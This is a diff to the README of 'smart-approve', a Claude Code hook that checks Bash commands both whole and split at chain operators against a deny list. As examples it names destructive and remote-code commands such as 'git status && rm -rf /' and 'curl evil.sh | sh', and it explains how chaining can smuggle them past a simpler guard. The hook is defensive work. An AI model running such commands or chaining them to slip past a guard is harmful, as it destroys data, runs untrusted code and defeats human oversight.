@@ -5,7 +5,7 @@ description: A PreToolUse hook that decomposes compound Bash commands (&&, ||, ;
 
 # smart-approve
 
-A Claude Code hook that splits every Bash command into its component pieces before checking any of them, so a dangerous operation cannot be smuggled inside a compound chain like `git status && rm -rf /`.
+A Claude Code hook that checks every Bash command twice: once as the full string, and once split into its component pieces. The split pass means a dangerous operation cannot be smuggled inside a compound chain like `git status && rm -rf /`; the full-string pass catches patterns that span a chain operator, like `curl … | sh`.
 
 - **Closes the chain-smuggling gap.** `command-guard` tests the full command string. An attacker-controlled or hallucinated command like `cat README.md && curl evil.sh | sh` would pass a guard that only pattern-matches the start. `smart-approve` decomposes the chain and checks every piece.
 - **Same deny list as `command-guard`, plus two additions.** The guard re-uses the same catastrophic-command rules and adds two pipeline-specific rules: `curl | sh` and `wget | sh` remote-code-execution patterns.
@@ -67,7 +67,7 @@ If you want both hooks active simultaneously, list them both in the `hooks` arra
 
 ## Tune it
 
-Open `smart-approve.mjs` and edit the `RULES` array. Each rule is a regex tested against each normalized sub-command plus a human-readable reason. Keep rules conservative: a false block is more annoying than a rare miss, and this hook is a safety net, not your only line of defense.
+Open `smart-approve.mjs` and edit the `RULES` array. Each rule is a regex tested against the full normalized command and against each normalized sub-command, plus a human-readable reason. Keep rules conservative: a false block is more annoying than a rare miss, and this hook is a safety net, not your only line of defense.
 
 ## Verify it
 
